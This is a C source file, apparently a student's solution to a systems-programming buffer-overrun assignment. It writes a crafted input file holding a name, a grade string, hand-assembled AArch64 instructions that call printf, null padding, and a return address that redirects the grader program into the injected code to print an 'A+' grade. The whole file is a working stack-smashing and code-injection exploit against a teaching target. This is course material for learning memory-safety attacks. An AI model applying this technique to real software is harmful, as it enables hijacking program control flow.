/*--------------------------------------------------------------------*/
/* createdataA.c                                                      */
/* Author: Kenar Vyas                                                 */
/*--------------------------------------------------------------------*/
#include <stdio.h>
#include "miniassembler.h"

/* Writes binary data to dataA file. Binary data is data for running
   buffer overrun attack on grader to recieve A+ grade. Returns 0 upon
   completion */
int main(void) {
   char* name = "Ken";
   char* grade = "A+";
   size_t lenName = 28;
   size_t lenBuf = 48;
   size_t lenNull;
   size_t i;
   unsigned long ulData;
   FILE *psFile;
   unsigned int uireg;
   unsigned int uiadd1;
   unsigned int uiadd2;

   /* Opens file and enables write access */
   psFile = fopen("dataAplus", "w");
   
   /* Prints name to file with padded zeroes */
   fprintf(psFile, name);
   for(i = 0; i < 1; i++)
   {
      putc('\0', psFile);
   }

   /* Prints grade with padded zeroes */
   fprintf(psFile, grade);
   for(i = 0; i < 2; i++)
   {
      putc('\0', psFile);
   }
   
   /* Instr: adr x0, 0x42005c*/
   uireg = 0x000000;
   uiadd1 = 0x42005c;
   uiadd2 = 0x420060;
   ulData = MiniAssembler_adr(uireg, uiadd1, uiadd2);
   fwrite(&ulData, sizeof(unsigned int), 1, psFile);

   /* Instr: bl 0x400600 <printf@plt> */
   uiadd1 = 0x400600;
   uiadd2 = 0x420064;
   ulData = 0x80000000;
   ulData |= MiniAssembler_b(uiadd1, uiadd2);   
   fwrite(&ulData, sizeof(unsigned int), 1, psFile);
   
   /* Instr: adr x0, 0x400962 */ 
   uireg = 0x000000;
   uiadd1 = 0x400962;
   uiadd2 = 0x420068;
   ulData = MiniAssembler_adr(uireg, uiadd1, uiadd2);
   fwrite(&ulData, sizeof(unsigned int), 1, psFile); 

   /* Instr: bl 0x400600 <printf@plt> */
   uiadd1 = 0x400600;
   uiadd2 = 0x42006c;
   ulData = 0x80000000;
   ulData |= MiniAssembler_b(uiadd1, uiadd2);   
   fwrite(&ulData, sizeof(unsigned int), 1, psFile);

   /* Instr: b to printf in main */
   uiadd1 = 0x400878;
   uiadd2 = 0x420070;
   ulData = MiniAssembler_b(uiadd1, uiadd2);
   fwrite(&ulData, sizeof(unsigned int), 1, psFile);

   /* Adds appropriate number of null bytes to reach getName 
      stackframe */ 
   lenNull = lenBuf - lenName;
   for(i = 0; i < lenNull; i++)
   {
      putc('\0', psFile);
   }

   /* Writes address of BSS name instuctions 
      to x30 in getName's stackframe */
   ulData = 0x420060;
   fwrite(&ulData, sizeof(unsigned long), 1, psFile);

   /* Closes file */
   fclose(psFile);
   return 0;
}
